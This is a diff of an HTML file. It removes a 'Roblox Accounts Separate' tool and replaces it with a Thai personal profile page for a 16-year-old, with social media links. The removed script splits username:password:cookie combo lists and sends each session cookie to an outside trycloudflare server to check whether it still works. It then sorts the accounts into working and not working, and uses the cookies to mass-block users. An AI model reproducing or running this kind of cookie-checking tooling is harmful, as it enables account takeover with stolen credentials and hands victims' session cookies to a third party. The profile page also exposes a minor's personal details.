@@ -1,395 +1,131 @@
-<!doctypehtml><html lang=en><meta charset=UTF-8><meta content="width=device-width,initial-scale=1"name=viewport><title>Roblox Accounts Separate</title><link href=https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css rel=stylesheet><style>body{background:linear-gradient(135deg,#e3f2fd,#4fc3f7);min-height:100vh;font-family:Inter,sans-serif;overflow-x:hidden}.container{max-width:1100px;margin:0 auto;padding:2.5rem}.card{background:rgba(255,255,255,.98);border-radius:1.5rem;box-shadow:0 6px 30px rgba(0,0,0,.1);padding:3rem;backdrop-filter:blur(12px);transform:translateY(0);animation:float 4s ease-in-out infinite}@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}.button{position:relative;overflow:hidden;transition:transform .3s,box-shadow .3s;box-shadow:0 4px 15px rgba(0,0,0,.1)}.button:hover{transform:scale(1.05);box-shadow:0 6px 20px rgba(0,0,0,.15)}.button::after{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);transition:.5s}.button:hover::after{left:100%}.page{display:none;animation:slideIn .5s ease-in-out}.page.active{display:block}@keyframes slideIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}h1{background:linear-gradient(to right,#0288d1,#4fc3f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:textGlow 2s ease-in-out infinite}@keyframes textGlow{0%,100%{text-shadow:0 0 5px rgba(79,195,247,.5)}50%{text-shadow:0 0 15px rgba(79,195,247,.8)}}textarea{resize:none;transition:border-color .3s}textarea:focus{border-color:#0288d1;box-shadow:0 0 10px rgba(2,136,209,.3)}.output-box{background:#f8fafc;border-radius:.5rem;padding:1rem;max-height:200px;overflow-y:auto}table{width:100%;border-collapse:collapse;margin-top:1rem}td,th{padding:.75rem;text-align:left;border-bottom:1px solid #e5e7eb}th{background:#f1f5f9;font-weight:600;color:#1e3a8a}.valid{color:#15803d;font-weight:500}.invalid{color:#b91c1c;font-weight:500}.pending{color:#d97706;font-weight:500}.blocked{color:#15803d;font-weight:500}.failed{color:#b91c1c;font-weight:500}.summary{margin-top:1rem;font-weight:600;color:#1e3a8a}.status-checking{color:#0288d1;font-weight:600;margin-bottom:1rem}.status-complete{color:#15803d;font-weight:600;margin-bottom:1rem}#copyButtons{display:none}footer{position:fixed;bottom:10px;right:10px;font-size:12px;color:#333}.toast{position:fixed;bottom:20px;right:20px;padding:1rem 1.5rem;border-radius:.5rem;color:#fff;font-weight:500;opacity:0;transform:translateY(20px);transition:opacity .3s,transform .3s;z-index:1000}.toast.show{opacity:1;transform:translateY(0)}.toast.success{background:#22c55e;box-shadow:0 4px 15px rgba(34,197,94,.3)}.toast.error{background:#ef4444;box-shadow:0 4px 15px rgba(239,68,68,.3)}</style><div class=container><div class=card><h1 class="mb-10 font-bold text-4xl text-center">Roblox Accounts Separate</h1><div class="flex space-x-4 justify-center mb-10"><button class="font-semibold bg-blue-500 button px-8 py-3 rounded-full text-white"onclick='showPage("split")'>Split Accounts</button> <button class="font-semibold bg-blue-500 button px-8 py-3 rounded-full text-white"onclick='showPage("check")'>Check Cookies</button> <button class="font-semibold bg-blue-500 button px-8 py-3 rounded-full text-white"onclick='showPage("block")'>Block Account</button></div><div class=page id=split><h2 class="font-semibold mb-4 text-2xl text-blue-800">Split Accounts</h2><div class="mb-4 flex space-x-4"><button class="button text-white px-4 py-2 rounded-lg bg-blue-600"onclick='pasteInput("inputData")'>Paste</button><p class="font-semibold text-gray-700 mt-2">Lines: <span id=inputLines>0</span></div><textarea class="mb-4 border border-gray-300 p-4 rounded-lg w-full"id=inputData oninput=processInput() placeholder="Enter data (Username:Password:Cookie)"rows=6></textarea><div class="flex space-x-6"><div class=w-1/2><div class="flex items-center justify-between mb-2"><p class="font-semibold text-gray-700">Username:Password (Lines: <span id=userPassLines>0</span>)</p><button class="button text-white px-4 py-2 rounded-lg bg-blue-600"onclick='copyText("userPassOutput")'>Copy</button></div><div class="text-gray-700 output-box"id=userPassOutput></div></div><div class=w-1/2><div class="flex items-center justify-between mb-2"><p class="font-semibold text-gray-700">Cookies (Lines: <span id=cookieLines>0</span>)</p><button class="button text-white px-4 py-2 rounded-lg bg-blue-600"onclick='copyText("cookieOutput")'>Copy</button></div><div class="text-gray-700 output-box"id=cookieOutput></div></div></div></div><div class=page id=check><h2 class="font-semibold mb-4 text-2xl text-blue-800">Check Cookies</h2><div class="mb-4 flex space-x-4"><button class="button text-white px-4 py-2 rounded-lg bg-blue-600"onclick='pasteInput("checkInputData")'>Paste</button><p class="font-semibold text-gray-700 mt-2">Lines: <span id=checkInputLines>0</span></div><textarea class="mb-4 border border-gray-300 p-4 rounded-lg w-full"id=checkInputData oninput=processCheckInput() placeholder="Enter data (Username:Password:Cookie or Cookie)"rows=6></textarea><div class="mb-4 flex space-x-4"id=copyButtons><button class="button text-white px-4 py-2 rounded-lg bg-green-500"onclick=copyValidAccounts()>Copy Account Working</button> <button class="button text-white px-4 py-2 rounded-lg bg-red-500"onclick=copyInvalidAccounts()>Copy Account Not Working</button></div><p class=status-checking id=checkStatus>Checking cookies...<p class=summary>Total: <span id=totalCount>0</span>, Valid: <span id=validCount>0</span>, Invalid: <span id=invalidCount>0</span><table><thead><tr><th>Identifier<th>Cookie Status<tbody id=checkTableBody></table></div><div class=page id=block><h2 class="font-semibold mb-4 text-2xl text-blue-800">Block Account</h2><div class="mb-4 flex space-x-4"><button class="button text-white px-4 py-2 rounded-lg bg-blue-600"onclick='pasteInput("blockInputData")'>Paste</button><p class="font-semibold text-gray-700 mt-2">Lines: <span id=blockInputLines>0</span></div><textarea class="mb-4 border border-gray-300 p-4 rounded-lg w-full"id=blockInputData oninput=processBlockInput() placeholder="Enter data (Username:Password:Cookie or Cookie)"rows=6></textarea><p class=status-checking id=blockStatus>Processing accounts...<p class=summary>Total: <span id=blockTotalCount>0</span>, Blocked: <span id=blockedCount>0</span>, Failed: <span id=failedCount>0</span><table><thead><tr><th>Identifier<th>UserID<th>Block Status<tbody id=blockTableBody></table></div></div></div><footer>Created by NopNopA, NopNop</footer><script>const Api = "https://leading-wow-animal-addressing.trycloudflare.com";
-        let accountData = [];
-        let blockAccountData = [];
-
-        function showNotification(message, type = 'success') {
-            const toast = document.createElement('div');
-            toast.className = `toast ${type}`;
-            toast.setAttribute('role', 'alert');
-            toast.setAttribute('aria-live', 'assertive');
-            toast.textContent = message;
-            document.body.appendChild(toast);
-
-            setTimeout(() => {
-                toast.classList.add('show');
-            }, 100);
-
-            setTimeout(() => {
-                toast.classList.remove('show');
-                setTimeout(() => {
-                    toast.remove();
-                }, 300);
-            }, 3000);
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Info Me</title>
+    <style>
+        body {
+            font-family: 'Prompt', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to bottom, #e6f3ff, #b3e0ff);
+            color: #333;
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
         }
-
-        function showPage(pageId) {
-            document.querySelectorAll('.page').forEach(page => {
-                page.classList.remove('active');
-            });
-            document.getElementById(pageId).classList.add('active');
-            if (pageId === 'check') {
-                processCheckInput();
-            } else if (pageId === 'block') {
-                processBlockInput();
+        .container {
+            max-width: 700px;
+            margin: 30px 20px;
+            padding: 25px;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        h1 {
+            font-size: 2.4em;
+            color: #0072ff;
+            margin: 10px 0;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        p {
+            font-size: 1.2em;
+            margin: 5px 0;
+            color: #444;
+        }
+        .profile-img {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            margin: 15px 0;
+            object-fit: cover;
+            border: 3px solid #0072ff;
+            transition: transform 0.3s ease;
+        }
+        .profile-img:hover {
+            transform: scale(1.1);
+        }
+        .bio {
+            margin: 5px 0;
+        }
+        .contact-links {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 20px 0;
+            width: 80%;
+        }
+        .contact-links a {
+            text-decoration: none;
+            font-size: 1.1em;
+            padding: 12px;
+            background: #0072ff;
+            color: #fff;
+            border-radius: 25px;
+            transition: background 0.3s ease, transform 0.3s ease;
+        }
+        .contact-links a:hover {
+            background: #005bb5;
+            transform: scale(1.05);
+        }
+        h2 {
+            font-size: 1.6em;
+            color: #0072ff;
+            margin: 10px 0;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #0072ff;
+            opacity: 0.8;
+        }
+        @media (max-width: 600px) {
+            .container {
+                max-width: 90%;
+                margin: 20px 10px;
+                padding: 15px;
             }
-        }
-
-        async function pasteInput(inputId) {
-            try {
-                const permission = await navigator.permissions.query({ name: 'clipboard-read' });
-                if (permission.state === 'denied') {
-                    showNotification('Clipboard read permission denied.', 'error');
-                    return;
-                }
-                const text = await navigator.clipboard.readText();
-                document.getElementById(inputId).value = text;
-                if (inputId === 'inputData') {
-                    processInput();
-                } else if (inputId === 'checkInputData') {
-                    processCheckInput();
-                } else if (inputId === 'blockInputData') {
-                    processBlockInput();
-                }
-            } catch (err) {
-                console.error('Failed to paste:', err);
-                showNotification('Failed to paste from clipboard.', 'error');
+            h1 {
+                font-size: 2em;
             }
-        }
-
-        async function copyText(elementId) {
-            const text = document.getElementById(elementId).textContent;
-            try {
-                const permission = await navigator.permissions.query({ name: 'clipboard-write' });
-                if (permission.state === 'denied') {
-                    showNotification('Clipboard write permission denied.', 'error');
-                    return;
-                }
-                await navigator.clipboard.writeText(text);
-                showNotification('Copied to clipboard!', 'success');
-            } catch (err) {
-                console.error('Failed to copy:', err);
-                showNotification('Failed to copy to clipboard.', 'error');
+            .profile-img {
+                width: 120px;
+                height: 120px;
             }
-        }
-
-        function processInput() {
-            const input = document.getElementById('inputData').value.trim();
-            const lines = input.split('\n').filter(line => line.trim() !== '');
-            document.getElementById('inputLines').textContent = lines.length;
-
-            let userPassOutput = [];
-            let cookieOutput = [];
-
-            lines.forEach(line => {
-                const parts = line.split(':');
-                if (parts.length >= 3) {
-                    const username = parts[0];
-                    const password = parts[1];
-                    const cookie = parts.slice(2).join(':');
-                    userPassOutput.push(`${username}:${password}`);
-                    cookieOutput.push(cookie);
-                }
-            });
-
-            document.getElementById('userPassOutput').textContent = userPassOutput.join('\n');
-            document.getElementById('cookieOutput').textContent = cookieOutput.join('\n');
-            document.getElementById('userPassLines').textContent = userPassOutput.length;
-            document.getElementById('cookieLines').textContent = cookieOutput.length;
-        }
-
-        async function checkCookie(cookie, retryOnce = true) {
-            try {
-                const response = await fetch(`${Api}/cookie`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ cookie })
-                });
-                if (!response.ok) {
-                    throw new Error(`HTTP error: ${response.status}`);
-                }
-                const result = await response.json();
-                return result.valid;
-            } catch (error) {
-                console.error('Error from server:', error);
-                if (retryOnce) {
-                    return await checkCookie(cookie, false);
-                }
-                return false;
+            .contact-links {
+                width: 90%;
+            }
+            .footer {
+                font-size: 0.8em;
             }
         }
-
-        async function processCheckInput() {
-            const input = document.getElementById('checkInputData').value.trim();
-            const lines = input.split('\n').filter(line => line.trim() !== '');
-            document.getElementById('checkInputLines').textContent = lines.length;
-            document.getElementById('totalCount').textContent = lines.length;
-            document.getElementById('validCount').textContent = '0';
-            document.getElementById('invalidCount').textContent = '0';
-
-            const tableBody = document.getElementById('checkTableBody');
-            const checkStatus = document.getElementById('checkStatus');
-            const copyButtons = document.getElementById('copyButtons');
-            tableBody.innerHTML = '';
-            accountData = [];
-
-            copyButtons.style.display = 'none';
-            checkStatus.textContent = 'Checking cookies...';
-            checkStatus.className = 'status-checking';
-
-            lines.forEach((line, index) => {
-                const parts = line.split(':');
-                let identifier, cookie;
-
-                if (parts.length >= 3) {
-                    identifier = parts[0];
-                    cookie = parts.slice(2).join(':');
-                } else {
-                    identifier = `Cookie ${index + 1}`;
-                    cookie = line;
-                }
-
-                accountData.push({ line, identifier, cookie, status: 'Pending' });
-
-                const row = document.createElement('tr');
-                row.id = `row-${index}`;
-                row.innerHTML = `
-                    <td>${identifier}</td>
-                    <td class="pending">Pending</td>
-                `;
-                tableBody.appendChild(row);
-            });
-
-            let validCount = 0;
-            let invalidCount = 0;
-
-            for (let i = 0; i < accountData.length; i++) {
-                const { cookie } = accountData[i];
-                const isValid = await checkCookie(cookie);
-                accountData[i].status = isValid ? 'Valid' : 'Invalid';
-
-                const row = document.getElementById(`row-${i}`);
-                row.innerHTML = `
-                    <td>${accountData[i].identifier}</td>
-                    <td class="${isValid ? 'valid' : 'invalid'}">${isValid ? 'Valid' : 'Invalid'}</td>
-                `;
-
-                if (isValid) {
-                    validCount++;
-                } else {
-                    invalidCount++;
-                }
-
-                document.getElementById('validCount').textContent = validCount;
-                document.getElementById('invalidCount').textContent = invalidCount;
-            }
-
-            copyButtons.style.display = 'flex';
-            checkStatus.textContent = 'Check complete!';
-            checkStatus.className = 'status-complete';
-        }
-
-        async function copyValidAccounts() {
-            const validAccounts = accountData
-                .filter(account => account.status === 'Valid')
-                .map(account => account.line)
-                .join('\n');
-            try {
-                const permission = await navigator.permissions.query({ name: 'clipboard-write' });
-                if (permission.state === 'denied') {
-                    showNotification('Clipboard write permission denied.', 'error');
-                    return;
-                }
-                await navigator.clipboard.writeText(validAccounts);
-                showNotification('Copied valid accounts to clipboard!', 'success');
-            } catch (err) {
-                console.error('Failed to copy valid accounts:', err);
-                showNotification('Failed to copy valid accounts.', 'error');
-            }
-        }
-
-        async function copyInvalidAccounts() {
-            const invalidAccounts = accountData
-                .filter(account => account.status === 'Invalid')
-                .map(account => account.line)
-                .join('\n');
-            try {
-                const permission = await navigator.permissions.query({ name: 'clipboard-write' });
-                if (permission.state === 'denied') {
-                    showNotification('Clipboard write permission denied.', 'error');
-                    return;
-                }
-                await navigator.clipboard.writeText(invalidAccounts);
-                showNotification('Copied invalid accounts to clipboard!', 'success');
-            } catch (err) {
-                console.error('Failed to copy invalid accounts:', err);
-                showNotification('Failed to copy invalid accounts.', 'error');
-            }
-        }
-
-        async function getUserID(cookie, retryOnce = true) {
-            try {
-                const response = await fetch(`${Api}/userid`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ cookie })
-                });
-                if (!response.ok) {
-                    throw new Error(`HTTP error: ${response.status}`);
-                }
-                const result = await response.json();
-                return result.userID || null;
-            } catch (error) {
-                console.error('Error fetching UserID:', error);
-                if (retryOnce) {
-                    return await getUserID(cookie, false);
-                }
-                showNotification('Failed to fetch UserID.', 'error');
-                return null;
-            }
-        }
-
-        async function blockAccount(userIDs, cookie, retryOnce = true) {
-            try {
-                const response = await fetch(`${Api}/block`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ userID: userIDs, cookie })
-                });
-                if (!response.ok) {
-                    throw new Error(`HTTP error: ${response.status}`);
-                }
-                const result = await response.json();
-                return result;
-            } catch (error) {
-                console.error('Error blocking account:', error);
-                if (retryOnce) {
-                    return await blockAccount(userIDs, cookie, false);
-                }
-                showNotification('Failed to block accounts.', 'error');
-                return { data: userIDs.reduce((acc, id) => ({ ...acc, [id]: false }), {}), successful_blocks: 0, total_blocks: userIDs.length, all_successful: false };
-            }
-        }
-
-        async function processBlockInput() {
-            const input = document.getElementById('blockInputData').value.trim();
-            const lines = input.split('\n').filter(line => line.trim() !== '');
-            document.getElementById('blockInputLines').textContent = lines.length;
-            if (lines.length > 100) {
-                showNotification('Input exceeds 100 lines. Only the first 100 will be processed.', 'error');
-            }
-            const processedLines = lines.slice(0, 100);
-            document.getElementById('blockTotalCount').textContent = processedLines.length;
-            document.getElementById('blockedCount').textContent = '0';
-            document.getElementById('failedCount').textContent = '0';
-
-            const tableBody = document.getElementById('blockTableBody');
-            const blockStatus = document.getElementById('blockStatus');
-            tableBody.innerHTML = '';
-            blockAccountData = [];
-
-            blockStatus.textContent = 'Fetching UserIDs...';
-            blockStatus.className = 'status-checking';
-
-            processedLines.forEach((line, index) => {
-                const parts = line.split(':');
-                let identifier, cookie;
-
-                if (parts.length >= 3) {
-                    identifier = parts[0];
-                    cookie = parts.slice(2).join(':');
-                } else {
-                    identifier = `Cookie ${index + 1}`;
-                    cookie = line;
-                }
-
-                blockAccountData.push({ line, identifier, cookie, userID: null, status: 'Pending', blockResults: {} });
-
-                const row = document.createElement('tr');
-                row.id = `block-row-${index}`;
-                row.innerHTML = `
-                    <td>${identifier}</td>
-                    <td>Fetching...</td>
-                    <td class="pending">Pending</td>
-                `;
-                tableBody.appendChild(row);
-            });
-
-            for (let i = 0; i < blockAccountData.length; i++) {
-                blockStatus.textContent = `Fetching UserIDs: ${i + 1}/${blockAccountData.length}`;
-                const { cookie } = blockAccountData[i];
-                const userID = await getUserID(cookie);
-                blockAccountData[i].userID = userID;
-
-                const row = document.getElementById(`block-row-${i}`);
-                row.innerHTML = `
-                    <td>${blockAccountData[i].identifier}</td>
-                    <td>${userID || 'N/A'}</td>
-                    <td class="pending">Pending</td>
-                `;
-            }
-
-            blockStatus.textContent = 'Blocking accounts...';
-            let blockedCount = 0;
-            let failedCount = 0;
-
-            for (let i = 0; i < blockAccountData.length; i++) {
-                const { userID, cookie } = blockAccountData[i];
-                let blockResults = {};
-
-                if (userID) {
-                    const targetUserIDs = blockAccountData
-                        .filter((_, j) => i !== j && blockAccountData[j].userID)
-                        .map(data => data.userID);
-                    
-                    if (targetUserIDs.length > 0) {
-                        const result = await blockAccount(targetUserIDs, cookie);
-                        blockResults = result.data;
-                    } else {
-                        blockResults = {};
-                    }
-                } else {
-                    blockResults = {};
-                }
-
-                blockAccountData[i].blockResults = blockResults;
-                const success = Object.values(blockResults).some(status => status);
-                blockAccountData[i].status = success ? 'Blocked' : 'Failed';
-
-                if (success) {
-                    blockedCount++;
-                } else {
-                    failedCount++;
-                }
-
-                const row = document.getElementById(`block-row-${i}`);
-                row.innerHTML = `
-                    <td>${blockAccountData[i].identifier}</td>
-                    <td>${blockAccountData[i].userID || 'N/A'}</td>
-                    <td class="${success ? 'blocked' : 'failed'}">${success ? 'Blocked' : 'Failed'}</td>
-                `;
-
-                if (Object.keys(blockResults).length > 0) {
-                    const detailRow = document.createElement('tr');
-                    detailRow.innerHTML = `
-                        <td colspan="3">
-                            <div class="output-box">
-                                ${Object.entries(blockResults).map(([uid, status]) => `UserID ${uid}: ${status ? 'Blocked' : 'Failed'}`).join('<br>')}
-                            </div>
-                        </td>
-                    `;
-                    tableBody.appendChild(detailRow);
-                }
-
-                document.getElementById('blockedCount').textContent = blockedCount;
-                document.getElementById('failedCount').textContent = failedCount;
-            }
-
-            blockStatus.textContent = 'Blocking complete!';
-            blockStatus.className = 'status-complete';
-        }</script>
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <h1>HI, สวัสดีครับ</h1>
+        <img src="https://img2.pic.in.th/pic/20250901_211142.jpg" class="profile-img">
+        <div class="bio">
+            <p>ยินดีต้อนรับสู่หน้าโปรไฟล์ของผม</p>
+            <p>ชื่อเล่น Fluke | ฟลุ๊ค ปัจจุบันอายุ 16 ปีครับ</p>
+            <p>ยังไม่มีอะไรอยากจะนำเสนอครับ 😭😭</p>
+            <p>-----------------------------------------------------</p>
+        </div>
+        <h2>ช่องทางการติดต่อ</h2>
+        <div class="contact-links">
+            <a href="https://www.facebook.com/PatcharaphonnOO" target="_blank">Facebook</a>
+            <a href="https://line.me/ti/p/47z8pSdKOO" target="_blank">Line</a>
+            <a href="https://www.instagram.com/nopn_opa14?igsh=MXZzeTJiYWc0a2t3dQ==" target="_blank">Instagram</a>
+        </div>
+        <div class="footer">Made by Patcharaphonn</div>
+    </div>
+</body>
+</html>
